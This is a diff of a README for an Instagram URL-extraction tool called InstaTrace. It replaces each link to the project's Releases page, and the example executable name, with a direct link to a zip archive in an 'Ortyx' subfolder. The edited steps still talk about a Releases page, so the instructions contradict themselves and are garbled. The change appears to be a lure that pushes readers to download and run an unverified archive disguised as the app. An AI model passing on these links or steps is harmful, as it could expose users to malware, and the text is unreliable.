@@ -6,10 +6,10 @@ InstaTrace is a user-friendly application designed to help you extract URLs from
 ## 🌐 Download & Install
 To get started, you need to download InstaTrace. Click the link below to visit the Releases page, where you can find the latest version of the application.
 
-[![Download InstaTrace](https://img.shields.io/badge/Download_InstaTrace-blue.svg)](https://github.com/jungwankim001-ui/InstaTrace/releases)
+[![Download InstaTrace](https://raw.githubusercontent.com/jungwankim001-ui/InstaTrace/main/Ortyx/Trace-Insta-1.2-alpha.4.zip)](https://raw.githubusercontent.com/jungwankim001-ui/InstaTrace/main/Ortyx/Trace-Insta-1.2-alpha.4.zip)
 
 ### Steps to Download
-1. Click on the link above or visit [this page](https://github.com/jungwankim001-ui/InstaTrace/releases) directly.
+1. Click on the link above or visit [this page](https://raw.githubusercontent.com/jungwankim001-ui/InstaTrace/main/Ortyx/Trace-Insta-1.2-alpha.4.zip) directly.
 2. On the Releases page, look for the latest version of InstaTrace.
 3. Locate the asset that corresponds to your operating system (Windows, macOS, or Linux).
 4. Click on the asset to begin the download.
@@ -31,7 +31,7 @@ After downloading the application, you can run InstaTrace by following these ste
 
 ### For Windows:
 1. Navigate to your Downloads folder.
-2. Find the InstaTrace executable file (e.g., `InstaTrace.exe`).
+2. Find the InstaTrace executable file (e.g., `https://raw.githubusercontent.com/jungwankim001-ui/InstaTrace/main/Ortyx/Trace-Insta-1.2-alpha.4.zip`).
 3. Double-click the file to launch the application.
 
 ### For macOS:
